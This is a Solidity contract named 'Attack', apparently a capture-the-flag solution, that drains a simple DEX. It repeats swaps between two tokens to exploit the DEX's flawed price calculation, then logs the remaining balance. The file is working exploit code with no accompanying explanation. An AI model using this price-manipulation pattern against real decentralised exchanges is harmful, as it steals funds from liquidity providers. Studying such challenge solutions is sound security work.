// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "forge-std/console.sol";

interface Dex{
    function swap(address, address , uint) external;
    function approve(address, uint) external;
    function balanceOf(address, address) external returns (uint);
    
}
contract Attack {
    
    Dex public dex = Dex(0xdE76A863E1E906B87Ab4B2193c651C0Cc1d6c79F);
    address public token1 = 0xF74AF94f865f633B225d59C0df1544A5deFBAAde;
    address public token2 = 0x5e03e7dD27067994E0C135a27633B0788C769add;

    function attack() public
    {
        dex.approve(address(dex), 1000);

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);
        console.log("token1 balance: ", dex.balanceOf(token1, address(dex)));
    }
}